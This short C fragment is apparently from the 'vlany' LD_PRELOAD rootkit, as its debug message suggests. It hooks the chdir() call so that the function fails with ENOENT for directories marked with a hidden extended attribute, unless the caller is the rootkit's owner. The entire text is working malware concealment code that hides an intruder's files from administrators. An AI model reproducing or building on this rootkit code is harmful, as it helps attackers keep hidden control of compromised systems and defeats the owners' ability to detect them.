int chdir(const char *path)
{
    #ifdef DEBUG
        printf("[vlany] chdir() called\n");
    #endif

    HOOK(old_chdir, CCHDIR);

    if(owned()) return old_chdir(path);

    if(hidden_xattr(path)) { errno = ENOENT; return -1; }

    return old_chdir(path);
}
